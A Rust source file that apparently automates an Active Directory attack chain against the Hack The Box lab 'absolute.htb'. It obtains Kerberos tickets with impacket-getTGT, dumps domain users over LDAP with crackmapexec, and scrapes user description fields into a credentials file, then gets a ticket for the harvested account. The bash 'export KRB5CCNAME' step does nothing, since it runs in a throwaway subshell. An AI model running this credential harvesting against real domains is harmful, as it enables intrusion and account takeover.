use std::process::Command;
use std::fs::{File, OpenOptions};
use std::io::{Write, BufRead, BufReader, BufWriter};
use console::strip_ansi_codes;
use regex::Regex;
use colored::*;

pub fn run(){
    println!("{}", "Creating TGT..".blue());
    run_impacket_gettgt_first_user();
    println!("{}", "Dumping Users....".blue());
    run_crackmapexec();
    println!("{}", "Updating Creds.txt...".green());
    update_creds_file();
    println!("{}", "Creating New TGT for New User...".blue());
    run_impacket_gettgt_second_user();
}

fn run_impacket_gettgt_first_user() {
    let input_path = "creds.txt";
    let file = File::open(input_path).expect("Unable to open file");
    let reader = BufReader::new(file);

    // Read the first line from the creds.txt file
    let first_line = reader.lines().next().expect("Unable to read line");
    let creds = first_line.expect("Unable to parse line");

    // Prepare the impacket-getTGT command with the specified arguments
    let output = Command::new("impacket-getTGT")
        .arg(format!("absolute.htb/{}", creds))
        .output()
        .expect("failed to execute impacket-getTGT");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));

    // Look for the line "Saving ticket in" and extract the ccache filename
    if let Some(ccache_line) = output_str.lines().find(|line| line.contains("Saving ticket in")) {
        let ccache_filename: &str = ccache_line.split("in ").nth(1).unwrap_or("").trim();

        // Run "export KRB5CCNAME="
        Command::new("bash")
            .arg("-c")
            .arg(format!("export KRB5CCNAME={}", ccache_filename))
            .output()
            .expect("failed to execute export KRB5CCNAME command");
        println!("Exported {}", ccache_filename);
    }
}

fn run_crackmapexec() {
    // Read the first line from the creds.txt file
    let input_path = "creds.txt";
    let file = File::open(input_path).expect("Unable to open file");
    let reader = BufReader::new(file);
    let first_line = reader.lines().next().expect("Unable to read line");
    let creds = first_line.expect("Unable to parse line");

    // Split the creds string by the colon and take the first part (username)
    let username = creds.split(':').next().unwrap_or("");
    // Split the creds string by the colon and take the second part (password)
    let password = creds.split(':').nth(1).unwrap_or("");

    // Prepare the crackmapexec command with the specified arguments
    let output_file_path = "crackmapexec_LDAP_output.txt";
    let output = Command::new("crackmapexec")
        .arg("ldap")
        .arg("absolute.htb")
        .arg("-u")
        .arg(username)
        .arg("-p")
        .arg(password)
        .arg("-k")
        .arg("--users")
        .output()
        .expect("failed to execute crackmapexec");

    // Write the command output to the output file
    let mut output_file = File::create(output_file_path).expect("Unable to create output file");
    output_file.write_all(&output.stdout).expect("Unable to write to output file");
    output_file.write_all(&output.stderr).expect("Unable to write to output file");

    println!("CrackMapExec results saved to {}", output_file_path);
}

fn update_creds_file() {
    // Open the crackmapexec_output.txt file
    let output_file_path = "crackmapexec_LDAP_output.txt";
    let output_file = File::open(output_file_path).expect("Unable to open output file");
    let output_reader = BufReader::new(output_file);

    // Open creds.txt
    let file = OpenOptions::new()
        .append(true)
        .open("creds.txt")
        .expect("Unable to open file");

    let mut file = BufWriter::new(file);

    // Define the regex pattern
    let pattern = Regex::new(r"(?i)LDAP\s+absolute\.htb\s+\d+\s+DC\s+(\S+)\s+(\S+)$").unwrap();

    for line in output_reader.lines() {
        let line = line.expect("Unable to read line");
        let line = strip_ansi_codes(&line);
        let line = String::from(line);

        if let Some(captured) = pattern.captures(&line) {
            println!("Matched Lines {}", line);
            let username = captured.get(1).unwrap().as_str();
            let info = captured.get(2).unwrap().as_str();

            // Check if part[5] is not empty and is a single string
            if !info.is_empty() && !info.contains(' ') {
                writeln!(&mut file, "{}:{}", username, info)
                    .expect("Unable to write data to file");
            }
        }
    }
}

fn run_impacket_gettgt_second_user() {
    let input_path = "creds.txt";
    let file = File::open(input_path).expect("Unable to open file");
    let reader = BufReader::new(file);

    // Read the second line from the creds.txt file
    let second_line = reader.lines().nth(1).expect("Unable to read second line");
    let creds = second_line.expect("Unable to parse second line");

    // Prepare the impacket-getTGT command with the specified arguments
    let output = Command::new("impacket-getTGT")
        .arg(format!("absolute.htb/{}", creds))
        .output()
        .expect("failed to execute impacket-getTGT");

    // Print the command output to the console
    let output_str = String::from_utf8_lossy(&output.stdout);
    println!("{}", output_str);
    println!("{}", String::from_utf8_lossy(&output.stderr));

    // Look for the line "Saving ticket in" and extract the ccache filename
    if let Some(ccache_line) = output_str.lines().find(|line| line.contains("Saving ticket in")) {
        let ccache_filename: &str = ccache_line.split("in ").nth(1).unwrap_or("").trim();

        // Run "export KRB5CCNAME="
        Command::new("bash")
            .arg("-c")
            .arg(format!("export KRB5CCNAME={}", ccache_filename))
            .output()
            .expect("failed to execute export KRB5CCNAME command");

        println!("Exported {}", ccache_filename);
    }
}
